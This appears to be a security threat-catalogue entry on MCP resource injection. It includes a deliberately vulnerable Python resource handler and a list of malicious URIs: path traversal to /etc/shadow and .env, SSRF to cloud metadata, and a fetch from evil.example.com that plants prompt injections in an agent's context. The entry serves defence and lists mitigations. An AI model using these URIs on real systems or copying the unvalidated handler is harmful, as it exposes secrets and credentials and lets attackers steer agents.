---
id: "TS-2026-0074"
title: "MCP Resource Injection via Poisoned URI Handlers"
category: "P1"
severity: "High"
description: "An attacker exploits MCP resource URI schemes to inject malicious content into agent context through crafted resource URIs that resolve to attacker-controlled data sources."
date: "2026-02-26"
tags: ["mcp", "resource-injection", "uri", "context-poisoning", "protocol"]
---

## Overview

MCP servers expose resources via URI schemes (e.g., `file://`, `db://`, `config://`). Agents fetch these resources to build context for their operations. If resource URI resolution is not properly sandboxed, an attacker can craft URIs that resolve to unexpected locations — SSRF-style attacks against internal services, path traversal to sensitive files, or redirect to attacker-controlled content that poisons the agent's context with injected instructions.

## Attack Vector

1. Attacker identifies MCP resources the agent accesses and their URI schemes
2. Crafted URIs exploit lax validation: path traversal, SSRF, or redirect chains
3. Agent fetches the malicious resource as trusted context
4. Poisoned resource content contains prompt injections or false data
5. Agent's subsequent decisions are influenced by the attacker-injected context

## Impact

- **Context poisoning** — agent operates on false information from malicious resources
- **SSRF** — resource fetching accesses internal services not meant to be exposed
- **Path traversal** — sensitive files read through directory traversal in URIs
- **Instruction injection** — resource content contains hidden agent instructions

## Example

```python
# Vulnerable MCP resource handler with insufficient URI validation
from mcp.server import Server
from mcp.types import Resource, TextContent
import urllib.request

app = Server("document-store")

@app.list_resources()
async def list_resources():
    return [
        Resource(uri="docs://internal/readme", name="README"),
        Resource(uri="docs://internal/config", name="Configuration"),
    ]

@app.read_resource()
async def read_resource(uri: str):
    # VULNERABLE: Insufficient URI validation
    if uri.startswith("docs://"):
        path = uri.replace("docs://", "")
        
        # Path traversal attack: "docs://internal/../../etc/passwd"
        # Resolves to reading /etc/passwd
        
        # SSRF attack: "docs://http://169.254.169.254/latest/meta-data/"
        # If handler follows redirects or accepts URL-like paths
        
        if path.startswith("http"):
            # Fetches from attacker-controlled server
            content = urllib.request.urlopen(path).read().decode()
        else:
            with open(f"/data/docs/{path}") as f:
                content = f.read()
        
        return [TextContent(type="text", text=content)]

# Attacker crafts resource URIs submitted via tool calls or prompt:
malicious_uris = [
    "docs://internal/../../etc/shadow",                    # Path traversal
    "docs://http://evil.example.com/inject.txt",           # SSRF to attacker
    "docs://internal/../.env",                             # Read secrets
    "docs://http://169.254.169.254/latest/meta-data/iam/", # Cloud metadata
]
```

## Mitigation

- Strictly validate and canonicalize all resource URIs before resolution
- Implement allowlists for resource URI schemes and paths
- Sandbox resource fetching — block access to internal networks and metadata endpoints
- Prevent path traversal by resolving paths and checking they remain within allowed directories
- Treat all resource content as untrusted input with prompt injection scanning
- See also: [TS-2026-0061](/skill/TS-2026-0061), [TS-2026-0063](/skill/TS-2026-0063)

## Real-World Examples

- **Lasso Security — MCP SSRF Risks (2026):** Identified resource URI exploitation as a top MCP security risk, where agents fetch attacker-controlled content through manipulated URI handlers. [Read more](https://www.lasso.security/blog/top-mcp-security-risks)
- **Capital One SSRF (2019):** The canonical SSRF attack — server tricked into fetching internal metadata URLs — directly parallels MCP resource URI injection where agents fetch attacker-specified URIs. [Read more](https://krebsonsecurity.com/2019/08/what-we-can-learn-from-the-capital-one-hack/)
